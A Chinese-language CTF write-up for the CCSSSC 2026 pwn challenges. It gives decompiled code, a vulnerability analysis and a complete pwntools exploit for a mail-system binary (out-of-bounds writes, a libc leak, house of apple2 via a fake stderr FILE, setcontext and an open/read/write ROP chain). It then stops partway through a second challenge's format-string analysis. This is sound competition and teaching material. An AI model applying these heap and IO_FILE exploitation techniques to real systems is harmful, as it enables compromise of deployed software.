---
title: CCSSSC-2026-pwn 题解
date: 2026-03-25 14:04:00
tags: 
    - pwn
    - CCSSSC2026
    - WriteUp
    - heap
    - house of apple2
    - orw
    - IO_FILE
    - 数组越界
    - off by one
    - tcache poisoning
categories: Contest
---
# 初赛

## MailSystem

唯一的 pwn

### checksec

```
[*] '/home/kali/Desktop/attachment/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

保护全开

### IDA

程序比较复杂，需要耐心分析，是一个简单的邮件系统

#### main

```c
void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    while ( 1 )
    {
      menu(a1, a2);
      v3 = 0;
      a2 = (char **)&v3;
      a1 = "%d";
      if ( (unsigned int)__isoc99_scanf("%d", &v3) == 1 )
        break;
      while ( getchar() != 10 )
        ;
      a1 = "Invalid input!";
      puts("Invalid input!");
    }
    if ( v3 == 3 )
    {
      puts("Goodbye!");
      exit(0);
    }
    if ( v3 > 3 )
    {
LABEL_13:
      a1 = "Invalid choice!";
      puts("Invalid choice!");
    }
    else if ( v3 == 1 )
    {
      login();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_13;
      register();
    }
  }
}
```

#### menu

```c
int menu()
{
  puts("Welcome to the mail system!");
  puts("1. login account");
  puts("2. register account");
  puts("3. exit");
  return printf("Your choice: ");
}
```

能注册和登录，可以正常退出

#### init

```c
int init()
{
  char *v0; // rax
  int i; // [rsp+4h] [rbp-Ch]
  FILE *stream; // [rsp+8h] [rbp-8h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  seccomp();
  for ( i = 0; i <= 11; ++i )
    this_is_time[34 * i] = time(0);
  this_is_admin = malloc(0x400u);
  memset(this_is_admin, 0, 0x400u);
  if ( !this_is_admin )
  {
    puts("malloc error");
    exit(-1);
  }
  v0 = (char *)this_is_admin + 50;
  *(_DWORD *)((char *)this_is_admin + 50) = 'imda';
  *((_WORD *)v0 + 2) = 'n';
  stream = fopen("/dev/urandom", "rb");
  if ( !stream )
  {
    puts("fopen error");
    exit(-1);
  }
  fread((char *)this_is_admin + 0x68, 1u, 0x10u, stream);
  return fclose(stream);
}
```

初始化管理员账号，管理员密码随机

#### login

```c
unsigned __int64 login()
{
  int i; // [rsp+Ch] [rbp-64h]
  char *v2; // [rsp+18h] [rbp-58h]
  char s2[32]; // [rsp+20h] [rbp-50h] BYREF
  char v4[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Input your name: ");
  __isoc99_scanf("%31s", s2);
  printf("Input your password: ");
  __isoc99_scanf("%31s", v4);
  if ( (unsigned int)admin_check(s2, v4) )
  {
    admin_panel();
  }
  else
  {
    for ( i = 0; i <= 11; ++i )
    {
      if ( user_table[i] )
      {
        v2 = (char *)(user_table[i] + 704LL);
        if ( !strcmp((const char *)(user_table[i] + 664LL), s2) && !strcmp(v2, v4) )
        {
          printf("Welcome back, %s!\n", s2);
          putchar(10);
          mail_panel(user_table[i]);
          return v5 - __readfsqword(0x28u);
        }
      }
    }
    puts("Login failed! Invalid username or password.");
    putchar(10);
  }
  return v5 - __readfsqword(0x28u);
}
```

登录逻辑

#### register

```c
unsigned __int64 register()
{
  int v1; // [rsp+Ch] [rbp-54h]
  char s1[32]; // [rsp+10h] [rbp-50h] BYREF
  char src[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+58h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v1 = add_user((__int64)user_table);
  if ( v1 != -1 )
  {
    printf("Input your name: ");
    __isoc99_scanf("%31s", s1);
    if ( !strcmp(s1, "admin") )
    {
      puts("Username illegal!");
      putchar(10);
      free((void *)user_table[v1]);
      user_table[v1] = 0;
    }
    else
    {
      strcpy((char *)(user_table[v1] + 0x298LL), s1);
      printf("Input your password: ");
      __isoc99_scanf("%31s", src);
      strcpy((char *)(user_table[v1] + 0x2C0LL), src);
      printf("Registered user: %s\n", s1);
      puts("Registration successful!");
      putchar(10);
    }
  }
  return v4 - __readfsqword(0x28u);
}
```

注册逻辑

#### admin_check

```c
__int64 __fastcall admin_check(const char *a1, const char *a2)
{
  if ( strcmp(a1, (const char *)this_is_admin + 0x32) )
    return 0;
  if ( !strncmp(a2, (const char *)this_is_admin + 0x68, 0x10u) )
  {
    puts("Welcome admin!");
    return 1;
  }
  else
  {
    puts("Wrong password for admin!");
    return 0;
  }
}
```

检测管理员账号

#### admin_panel

```c
unsigned __int64 admin_panel()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("=== Admin Menu ===");
      puts("1. Change user info");
      puts("2. Delete user");
      puts("3. Mail to user");
      puts("4. Mail user to user");
      puts("5. Logout");
      printf("Your choice: ");
      v1 = 0;
      if ( (unsigned int)__isoc99_scanf("%d", &v1) == 1 )
        break;
      while ( getchar() != 10 )
        ;
      puts("Invalid input!");
      putchar(10);
    }
    switch ( v1 )
    {
      case 1:
        change_user_info();
        break;
      case 2:
        delete_user();
        break;
      case 3:
        mail_to_user();
        break;
      case 4:
        mail_user_to_user();
        break;
      case 5:
        puts("Logging out as admin...");
        putchar(10);
        return v2 - __readfsqword(0x28u);
      default:
        puts("Invalid choice!");
        putchar(10);
        break;
    }
  }
}
```

管理员面板

#### mail_panel

```c
unsigned __int64 __fastcall mail_panel(size_t *a1)
{
  int v2; // [rsp+10h] [rbp-10h] BYREF
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      mail_menu();
      v2 = 0;
      if ( (unsigned int)__isoc99_scanf("%d", &v2) == 1 )
        break;
      while ( getchar() != 10 )
        ;
      puts("Invalid input!");
      putchar(10);
    }
    if ( v2 == 4 )
      break;
    if ( v2 > 4 )
      goto LABEL_16;
    switch ( v2 )
    {
      case 3:
        v3 = send_mail(a1);
        if ( v3 == 1 )
          return v4 - __readfsqword(0x28u);
        break;
      case 1:
        write_mail((__int64)a1);
        break;
      case 2:
        read_mail((__int64)a1);
        break;
      default:
LABEL_16:
        puts("Invalid choice!");
        putchar(10);
        break;
    }
  }
  puts("Logging out...");
  putchar(10);
  return v4 - __readfsqword(0x28u);
}
```

用户面板

#### add_user

```c
__int64 __fastcall add_user(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  int i; // [rsp+18h] [rbp-8h]
  int j; // [rsp+1Ch] [rbp-4h]

  v2 = 0;
  for ( i = 0; i <= 11; ++i )
  {
    if ( *(_QWORD *)(8LL * i + a1) && *(_QWORD *)(*(_QWORD *)(8LL * i + a1) + 0x278LL) )
      ++v2;
  }
  if ( v2 <= 7 )
  {
    for ( j = 0; ; ++j )
    {
      if ( j > 12 )
        return 0xFFFFFFFFLL;
      if ( !*(_QWORD *)(8LL * j + a1) || *(_QWORD *)(*(_QWORD *)(8LL * j + a1) + 0x388LL) != 1 )
        break;
    }
    *(_QWORD *)(8LL * j + a1) = malloc(0x410u);
    memset(*(void **)(8LL * j + a1), 0, 0x410u);
    if ( !*(_QWORD *)(8LL * j + a1) )
    {
      perror("malloc failed");
      exit(-1);
    }
    *(_QWORD *)(*(_QWORD *)(8LL * j + a1) + 0x278LL) = j + 1;
    *(_QWORD *)(*(_QWORD *)(8LL * j + a1) + 0x388LL) = 1;
    return (unsigned int)j;
  }
  else
  {
    puts("User full!");
    return 0xFFFFFFFFLL;
  }
}
```

添加用户，特定情况下存在正向越界写

#### mail_user_to_user

```c
unsigned __int64 mail_user_to_user()
{
  int v1; // [rsp+Ch] [rbp-34h] BYREF
  int v2; // [rsp+10h] [rbp-30h] BYREF
  int v3; // [rsp+14h] [rbp-2Ch] BYREF
  size_t n; // [rsp+18h] [rbp-28h]
  size_t v5; // [rsp+20h] [rbp-20h]
  void *v6; // [rsp+28h] [rbp-18h]
  void *src; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  printf("Enter source user ID (whose mail to forward): (1-12) ");
  if ( (unsigned int)__isoc99_scanf("%d", &v1) != 1 )
  {
    puts("Invalid source user ID!");
    while ( getchar() != 10 )
      ;
    goto ret;
  }
  printf("Enter destination user ID (1-12): ");
  if ( (unsigned int)__isoc99_scanf("%d", &v2) != 1 )
  {
    puts("Invalid destination user ID!");
    while ( getchar() != 10 )
      ;
    goto ret;
  }
  if ( v1 > 12 )
  {
    puts("Source user ID out of range!");
    putchar(10);
  }
  else if ( user_table[v1 - 1] )
  {
    if ( v2 > 12 )
    {
      puts("Destination user ID out of range!");
      putchar(10);
    }
    else if ( user_table[v2 - 1] )
    {
      if ( !*(_QWORD *)(user_table[v2 - 1] + 0x308LL)
        || (printf("Warning: User %d already has unread mail. Overwrite? (y/n): ", v2),
            __isoc99_scanf(" %c", &v3),
            (_BYTE)v3 == 0x79)
        || (_BYTE)v3 == 0x59 )
      {
        if ( v1 > 12 )
        {
ret:
          putchar(10);
          return v8 - __readfsqword(0x28u);
        }
        puts("Which mail would you like to forward?");
        puts("1. User's draft");
        puts("2. User's inbox mail");
        printf("Your choice: ");
        if ( (unsigned int)__isoc99_scanf("%d", &v3) != 1 )
        {
          puts("Invalid input!");
          while ( getchar() != 10 )
            ;
          goto ret;
        }
        if ( v2 <= 12 )
          *(_QWORD *)(user_table[v2 - 1] + 0x308LL) = 1;
        if ( v3 == 1 )
        {
          if ( v2 <= 12 )
          {
            n = *(_QWORD *)(user_table[v1 - 1] + 0x100LL);
            if ( n > 0x100 )
              n = 256;
            src = (void *)(user_table[v1 - 1] + 0x110LL);
            memcpy((void *)user_table[v2 - 1], src, n);
            *(_QWORD *)(user_table[v2 - 1] + 0x210LL) = n;
          }
        }
        else
        {
          if ( v3 != 2 )
          {
            puts("Invalid choice!");
            putchar(10);
            return v8 - __readfsqword(0x28u);
          }
          if ( v2 <= 12 )
          {
            v5 = *(_QWORD *)(user_table[v1 - 1] + 0x210LL);
            if ( v5 > 0x100 )
              v5 = 0x100;
            v6 = (void *)user_table[v1 - 1];
            memcpy((void *)user_table[v2 - 1], v6, v5);
            *(_QWORD *)(user_table[v2 - 1] + 0x210LL) = v5;
          }
        }
        printf("Mail forwarded from index %d to index %d!\n", v1, v2);
      }
      else
      {
        puts("Forwarding cancelled.");
        putchar(10);
      }
    }
    else
    {
      printf("Destination user %d does not exist!\n", v2);
      putchar(10);
    }
  }
  else
  {
    printf("Source user %d does not exist!\n", v1);
    putchar(10);
  }
  return v8 - __readfsqword(0x28u);
}
```

管理员以某一用户名义发邮件给另一名用户，存在越界读写

#### mail_menu

```c
int mail_menu()
{
  puts("1. Write mail");
  puts("2. Read mail");
  puts("3. Send mail");
  puts("4. Logout");
  return printf("Your choice: ");
}
```

用户菜单

#### write_mail

```c
unsigned __int64 __fastcall write_mail(__int64 a1)
{
  int v2; // [rsp+18h] [rbp-118h] BYREF
  int v3; // [rsp+1Ch] [rbp-114h]
  _BYTE buf[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v5; // [rsp+128h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("How many bytes do you want to write? (1-%d): ", 256);
  if ( (unsigned int)__isoc99_scanf("%d", &v2) != 1 )
  {
    puts("Invalid input!");
    while ( getchar() != 10 )
      ;
LABEL_16:
    putchar(10);
    return v5 - __readfsqword(0x28u);
  }
  if ( v2 > 0 && v2 <= 256 )
  {
    printf("Write your mail content (max %d bytes):\n", v2);
    while ( getchar() != 10 )
      ;
    v3 = read(0, buf, v2);
    if ( v3 <= 0 )
    {
      puts("Failed to read input!");
    }
    else
    {
      memcpy((void *)(a1 + 0x110), buf, v3);
      *(_QWORD *)(a1 + 0x100) = v3;
      if ( v3 > 0xFF )
        *(_BYTE *)(a1 + 0x20F) = 0;
      else
        *(_BYTE *)(v3 + 0x110LL + a1) = 0;
      *(_QWORD *)(a1 + 0x310) = 1;
      puts("Draft saved!");
    }
    goto LABEL_16;
  }
  printf("Write size must be between 1 and %d bytes.\n", 256);
  putchar(10);
  return v5 - __readfsqword(0x28u);
}
```

写邮件

#### read_mail

```c
unsigned __int64 __fastcall read_mail(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      read_menu();
      if ( (unsigned int)__isoc99_scanf("%d") == 1 )
        break;
      while ( getchar() != 10 )
        ;
      puts("Invalid input!");
    }
    if ( v2 == 3 )
      break;
    if ( v2 > 3 )
      goto LABEL_17;
    if ( v2 == 1 )
    {
      if ( *(_QWORD *)(a1 + 0x310) )
      {
        puts("Your saved draft:");
        puts((const char *)(a1 + 0x110));
        putchar(10);
      }
      else
      {
        puts("No saved draft found.\n");
      }
    }
    else if ( v2 == 2 )
    {
      if ( *(_QWORD *)(a1 + 0x308) )
      {
        puts("Inbox (new mail):");
        puts((const char *)a1);
        *(_QWORD *)(a1 + 0x308) = 0;
        putchar(10);
      }
      else
      {
        puts("No new mail in inbox.\n");
      }
    }
    else
    {
LABEL_17:
      puts("Invalid choice!\n");
    }
  }
  putchar(10);
  return v3 - __readfsqword(0x28u);
}
```

读邮件

#### send_mail

```c
__int64 __fastcall send_mail(size_t *a1)
{
  char v2; // [rsp+1Bh] [rbp-25h] BYREF
  int v3; // [rsp+1Ch] [rbp-24h] BYREF
  size_t n; // [rsp+20h] [rbp-20h]
  size_t v5; // [rsp+28h] [rbp-18h]
  _QWORD *v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("Who do you want to send the mail to? (input user ID 1-12)");
  if ( (unsigned int)__isoc99_scanf("%d", &v3) == 1 )
  {
    if ( v3 > 0 && v3 <= 12 )
    {
      if ( user_table[v3 - 1] )
      {
        if ( a1[0x62] )
        {
          v5 = a1[0x4F];
          v6 = &this_is_time[34 * v5 - 34];
          ++*((_DWORD *)v6 + 2);
          if ( (unsigned int)secure_check(v5) )
          {
            return 1;
          }
          else if ( !*(_QWORD *)(user_table[v3 - 1] + 0x308LL)
                 || (printf("Warning: User %d already has unread mail. Overwrite? (y/n): ", v3),
                     __isoc99_scanf(" %c", &v2),
                     v2 == 121)
                 || v2 == 89 )
          {
            n = a1[32];
            if ( n > 0x100 )
              n = 256;
            *(_QWORD *)(user_table[v3 - 1] + 0x308LL) = 1;
            memcpy((void *)user_table[v3 - 1], a1 + 34, n);
            *(_QWORD *)(user_table[v3 - 1] + 0x210LL) = n;
            a1[98] = 0;
            printf("Mail sent to user %d!\n", v3);
            putchar(10);
            return 0;
          }
          else
          {
            puts("Mail sending cancelled.");
            putchar(10);
            return 0;
          }
        }
        else
        {
          puts("No draft to send! Please write a mail first.");
          putchar(10);
          return 0;
        }
      }
      else
      {
        puts("User does not exist!");
        putchar(10);
        return 0;
      }
    }
    else
    {
      puts("Invalid user ID! Must be between 1 and 12.");
      putchar(10);
      return 0;
    }
  }
  else
  {
    puts("Invalid input!");
    while ( getchar() != 10 )
      ;
    putchar(10);
    return 0;
  }
}
```

发送邮件

#### read_menu

```c
int read_menu()
{
  puts("What would you like to read?");
  puts("1. My saved draft");
  puts("2. Inbox (mails sent to me)");
  puts("3. Back to main menu");
  return printf("Your choice: ");
}
```

读邮件面板

#### secure_check

```c
__int64 __fastcall secure_check(int a1)
{
  time_t v2; // [rsp+10h] [rbp-20h]
  time_t *v3; // [rsp+18h] [rbp-18h]
  _QWORD *v4; // [rsp+20h] [rbp-10h]
  FILE *stream; // [rsp+28h] [rbp-8h]

  v2 = time(0);
  v3 = &this_is_time[34 * a1 - 34];
  if ( v2 - *v3 > 10 || *((int *)v3 + 2) <= 4 )
  {
    if ( v2 - *v3 > 10 )
    {
      *((_DWORD *)v3 + 2) = 0;
      *v3 = v2;
    }
    return 0;
  }
  else
  {
    printf("\x1B[1;31;40m[SECURITY] Risk detected for user %d! Account banned.\x1B[0m\n", a1);
    if ( a1 > 0 && a1 <= 12 && user_table[a1 - 1] )
    {
      v4 = (_QWORD *)user_table[a1 - 1];
      v4[0x53] = 'lagelli';
      stream = fopen("/dev/urandom", "rb");
      if ( stream )
      {
        fread(v4 + 88, 1u, 0x10u, stream);
        fclose(stream);
      }
      v4[0x4F] = 0;
      puts("Account has been banned!");
      puts("Returning to login menu...\n");
    }
    return 1;
  }
}
```

安全检测，发送频率过高会封号

### bss

```
.bss:0000000000007020 ; ===========================================================================
.bss:0000000000007020
.bss:0000000000007020 ; Segment type: Uninitialized
.bss:0000000000007020 ; Segment permissions: Read/Write
.bss:0000000000007020 _bss            segment align_32 public 'BSS' use64
.bss:0000000000007020                 assume cs:_bss
.bss:0000000000007020                 ;org 7020h
.bss:0000000000007020                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0000000000007020                 public stdout
.bss:0000000000007020 ; FILE *stdout
.bss:0000000000007020 stdout          dq ?                    ; DATA XREF: LOAD:00000000000006A0↑o
.bss:0000000000007020                                         ; init+2A↑r
.bss:0000000000007020                                         ; Copy of shared data
.bss:0000000000007028                 align 10h
.bss:0000000000007030                 public stdin
.bss:0000000000007030 ; FILE *stdin
.bss:0000000000007030 stdin           dq ?                    ; DATA XREF: LOAD:00000000000006D0↑o
.bss:0000000000007030                                         ; init+C↑r
.bss:0000000000007030                                         ; Copy of shared data
.bss:0000000000007038                 align 20h
.bss:0000000000007040                 public stderr
.bss:0000000000007040 ; FILE *stderr
.bss:0000000000007040 stderr          dq ?                    ; DATA XREF: LOAD:0000000000000700↑o
.bss:0000000000007040                                         ; init+48↑r
.bss:0000000000007040                                         ; Copy of shared data
.bss:0000000000007048 byte_7048       db ?                    ; DATA XREF: sub_13E0+4↑r
.bss:0000000000007048                                         ; sub_13E0+2C↑w
.bss:0000000000007049                 align 20h
.bss:0000000000007060 ; _QWORD user_table[12]
.bss:0000000000007060 user_table      dq 0Ch dup(?)           ; DATA XREF: secure_check+A7↑o
.bss:0000000000007060                                         ; secure_check+CB↑o ...
.bss:00000000000070C0 ; void *this_is_admin
.bss:00000000000070C0 this_is_admin   dq ?                    ; DATA XREF: init+BC↑w
.bss:00000000000070C0                                         ; init+C3↑r ...
.bss:00000000000070C8                 align 20h
.bss:00000000000070E0 ; _QWORD this_is_time[408]
.bss:00000000000070E0 this_is_time    dq 198h dup(?)          ; DATA XREF: secure_check+34↑o
.bss:00000000000070E0                                         ; init+9D↑o ...
.bss:00000000000070E0 _bss            ends
.bss:00000000000070E0
```

bss 结构

### 攻击思路

难点是梳理程序流程和内存的结构以及识别漏洞点

#### 管理员内存结构

管理员内存大小为 0x400

```
0x32:   名称
0x68:   密码
```

#### 用户内存结构

用户内存大小为 0x410

```
0x0-0x100:      0x100   收件
0x100-0x108:    0x8     草稿大小
0x110-0x210:    0x100   草稿
0x210-0x218:    0x8     收件大小
0x278-0x280:    0x8     编号，被 ban 清零
0x298-0x2B8:    0x20    用户名
0x2C0-0x2E8:    0x28    密码
0x308-0x310:    0x8     收件标记
0x310-0x318:    0x8     草稿标记
0x388-0x390:    0x8     存在标记
```

#### 漏洞点利用

在注册时有这样的逻辑：

```c
  v2 = 0;
  for ( i = 0; i <= 11; ++i )
  {
    if ( *(_QWORD *)(8LL * i + a1) && *(_QWORD *)(*(_QWORD *)(8LL * i + a1) + 0x278LL) )
      ++v2;
  }
  if ( v2 <= 7 )
  {
    for ( j = 0; ; ++j )
    {
      if ( j > 12 )
        return 0xFFFFFFFFLL;
      if ( !*(_QWORD *)(8LL * j + a1) || *(_QWORD *)(*(_QWORD *)(8LL * j + a1) + 0x388LL) != 1 )
        break;
    }
```

这里 j 在出 for 循环时可以为 12 ，这样的话可以从用户表越界到管理员表，把管理员的名称和密码都清空，这样就可以直接登录管理员账号了

但是要使 j 为 12 ，就要绕过上面对 v2 的大小检验，这要求 `*(_QWORD *)(*(_QWORD *)(8LL * i + a1) + 0x278LL)` 为 0 而 `*(_QWORD *)(*(_QWORD *)(8LL * j + a1) + 0x388LL` 不为零，该情况发生的条件是用户被 ban

而要想用户被 ban ，根据 secure_check 的逻辑只要在 10 秒内发送超过四次邮件即可

于是我们每注册一个用户就 ban 一个，直到填满用户表使溢出发生后即可成为管理员

成为管理员后的 mail_user_to_user 中有反向越界读写，可以通过标准流指针泄露 libc 基址，然后通过往 stderr 里面发送 fake_io 信件打 house_of_apple2 ，走 setcontext 去跑 read 再写入 orw_chain

比赛时最后十分钟过了本地但是远程炸了，淦，好像是交互时间过长的问题。

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./pwn_patched')
else:
	io = remote('192.0.100.2',  9999)

libc = ELF('./libc.so.6')

### login

def login(name, pwd):
	io.sendlineafter(b'choice: ', b'1')
	io.sendlineafter(b'name: ', name)
	io.sendlineafter(b'password: ', pwd)

def register(name, pwd):
	io.sendlineafter(b'choice: ', b'2')
	io.sendlineafter(b'name: ', name)
	io.sendlineafter(b'password: ', pwd)

def myexit():
	io.sendlineafter(b'choice: ', b'3')

### user

def writemail(bt, content):
	io.sendlineafter(b'choice: ', b'1')
	io.sendlineafter(b'(1-256): ', str(bt).encode())
	io.sendlineafter(b'bytes):\n', content)

def readmail(choice):
	io.sendlineafter(b'choice: ', b'2')
	io.sendlineafter(b'choice: ', str(choice).encode())

def back2menu():
	io.sendlineafter(b'choice: ', b'3')

def sendmail(id, rep = False):
	io.sendlineafter(b'choice: ', b'3')
	io.sendlineafter(b'(input user ID 1-12)', str(id).encode())
	if rep:
		io.sendlineafter(b'(y/n): ', b'y')

def logout():
	io.sendlineafter(b'choice: ', b'4')

### admin

def user2user(src, dst, choice, rep = False):
	io.sendlineafter(b'choice: ', b'4')
	io.sendlineafter(b': (1-12) ', str(src).encode())
	io.sendlineafter(b'(1-12): ', str(dst).encode())
	if rep:
		io.sendlineafter(b'(y/n): ', b'y')
	io.sendlineafter(b'choice: ', str(choice).encode())

def admin_logout():
	io.sendlineafter(b'choice: ', b'5')

def attack():
	for i in range(12):		# admin
		register(b'AAA' + str(i).encode(), b'BBB')
		login(b'AAA' + str(i).encode(), b'BBB')
		if i >= 7:
			writemail(1, b'C')
			sendmail(i + 1)
			for _ in range(3):
				writemail(1, b'C')
				sendmail(i + 1, True)
			writemail(1, b'C')
			sendmail(i + 1)
		logout()
	register(b'AAA' + str(13).encode(), b'BBB')

	login(b'\x00', b'\x00')
	user2user(-3, 1, 1)
	admin_logout()

	login(b'AAA0', b'BBB')
	readmail(2)
	io.recvuntil(b'(new mail):\n')
	libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x21b803
	log.info(f'libc = {hex(libc.address)}')
	back2menu()
	logout()

	stderr = libc.sym['_IO_2_1_stderr_']

	pop_rax_ret = libc.address + 0x45eb0
	pop_rdi_ret = libc.address + 0x2a3e5
	pop_rsi_ret = libc.address + 0x2be51
	pop_rdx_pop_r12_ret = libc.address + 0x11f357
	syscall_ret = libc.address + 0x91316

	read_rop_chain = flat([
		0,
		pop_rsi_ret,
		stderr + 0x68,
		pop_rdx_pop_r12_ret,
		0x100,
		0,
		syscall_ret
	])

	fake_io = flat({
			0x0: 0,
			0x10: '/flag\x00',
			0x28: libc.sym['setcontext'] + 0x3d,
			0x30: read_rop_chain,
			0x70: stderr + 0x30, # RSP
			0X78: pop_rdi_ret, # RIP
			0x88: stderr,
			0xA0: stderr - 0x30,
			0xB0: stderr - 0x40,
			0xD8: libc.sym['_IO_wfile_jumps']
		},
		filler=b"\x00"
	)

	login(b'AAA0', b'BBB')
	writemail(len(fake_io), fake_io)
	logout()

	login(b'\x00', b'\x00')
	user2user(1, -3, 1)
	admin_logout()

	myexit()

	orw_rop_chain = flat([
		pop_rax_ret,
		2,
		pop_rdi_ret,
		stderr + 0x10,
		syscall_ret,		# open("/flag")
		pop_rax_ret,
		0,
		pop_rdi_ret,
		3,
		pop_rsi_ret,
		stderr + 0x100,
		pop_rdx_pop_r12_ret,
		0x100,
		0,
		syscall_ret,		# read(3, buf, 0x100)
		pop_rax_ret,
		1,
		pop_rdi_ret,
		1,
		pop_rsi_ret,
		stderr + 0x100,
		pop_rdx_pop_r12_ret,
		0x100,
		0,
		syscall_ret		# write(1, buf, 0x100)
	])

	#gdb.attach(io)
	io.sendlineafter(b'Goodbye!\n', orw_rop_chain)

	io.interactive()

attack()
```

# 区域决赛

## robo_admin

呜呜呜我好菜啊比赛时怎么做不出来呜呜呜

### checksec

```
[*] '/home/RatherHard/CTF-pwn/ccsssc/robo_admin/题目附件/robo_admin'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

### IDA

#### mystart

```c
__int64 mystart()
{
  int v0; // eax
  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v3; // [rsp+8h] [rbp-18h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  seccomp();
  clear();
  pwdgen();
  puts("Robo Admin Service");
  while ( 1 )
  {
    puts("\n=== Main Menu ===");
    puts("1. set notice");
    puts("2. show status");
    puts("3. admin login");
    puts("4. exit");
    puts("> ");
    *(_QWORD *)nptr = 0;
    v3 = 0;
    myread(nptr, 16);
    v0 = atoi(nptr);
    if ( v0 == 4 )
      break;
    if ( v0 > 4 )
      goto LABEL_13;
    switch ( v0 )
    {
      case 3:
        judger = admin_judge();
        if ( judger )
          admin_panel();
        break;
      case 1:
        setnotice();
        break;
      case 2:
        showstatus();
        break;
      default:
LABEL_13:
        puts("[X] invalid");
        break;
    }
  }
  puts("bye");
  return 0;
}
```

菜单题

#### seccomp

```c
__int64 seccomp()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112);
  if ( !v1 )
    _exit(1);
  if ( (unsigned int)seccomp_rule_add(v1, 0, 2, 0) )
    _exit(1);
  if ( (unsigned int)seccomp_rule_add(v1, 0, 59, 0) )
    _exit(1);
  if ( (unsigned int)seccomp_rule_add(v1, 0, 322, 0) )
    _exit(1);
  if ( (unsigned int)seccomp_load(v1) )
    _exit(1);
  return seccomp_release(v1);
}
```

禁用了 open 和 execve ，可以用 openat

#### setnotice

```c
unsigned __int64 setnotice()
{
  _QWORD src[32]; // [rsp+0h] [rbp-310h] BYREF
  char s[8]; // [rsp+100h] [rbp-210h] BYREF
  __int64 v3; // [rsp+108h] [rbp-208h]
  _BYTE v4[496]; // [rsp+110h] [rbp-200h] BYREF
  unsigned __int64 v5; // [rsp+308h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_QWORD *)s = 0;
  v3 = 0;
  memset(v4, 0, sizeof(v4));
  memset(src, 0, sizeof(src));
  myread(s, 512);
  if ( strchr(s, 37) || strchr(s, 36) )
  {
    puts("[X] raw input contains illegal chars");
  }
  else if ( (unsigned int)((__int64 (__fastcall *)(char *, _QWORD *, __int64))decode)(s, src, 256) )
  {
    puts("[X] decode failed");
  }
  else
  {
    memcpy(notice, src, sizeof(notice));
    byte_52BF = 0;
    ntc_tag = 1;
    puts("[+] notice updated");
  }
  return v5 - __readfsqword(0x28u);
}
```

禁止明文出现 '%' 和 '$' ，防止直接的格式化字符串攻击

#### decode

```c
__int64 __fastcall decode(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // rax
  int v7; // [rsp+20h] [rbp-18h]
  int v8; // [rsp+24h] [rbp-14h]
  __int64 v9; // [rsp+28h] [rbp-10h]
  __int64 i; // [rsp+30h] [rbp-8h]

  v9 = 0;
  for ( i = 0; *(_BYTE *)(a1 + i); ++i )
  {
    if ( a3 <= v9 + 1 )
      return 0xFFFFFFFFLL;
    if ( *(_BYTE *)(a1 + i) == 92 && *(_BYTE *)(i + 1 + a1) == 120 )
    {
      v7 = decodechr((unsigned int)*(char *)(i + 2 + a1));
      v8 = decodechr((unsigned int)*(char *)(i + 3 + a1));
      if ( v7 < 0 || v8 < 0 )
        return 0xFFFFFFFFLL;
      v4 = v9++;
      *(_BYTE *)(a2 + v4) = v8 | (16 * v7);
      i += 3;
    }
    else
    {
      v5 = v9++;
      *(_BYTE *)(v5 + a2) = *(_BYTE *)(a1 + i);
    }
  }
  *(_BYTE *)(a2 + v9) = 0;
  return 0;
}
```

解码器没有对格式化字符串的校验，可以利用这一点绕过前面的明文校验

#### showstatus

```c
unsigned __int64 __fastcall showstatus(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 v4; // r8
  __int64 v5; // r9
  __int64 v7; // [rsp+0h] [rbp-40h]
  __int64 v8; // [rsp+8h] [rbp-38h]
  _QWORD v9[2]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v10; // [rsp+20h] [rbp-20h]
  __int64 v11; // [rsp+28h] [rbp-18h]
  unsigned __int64 v12; // [rsp+38h] [rbp-8h]

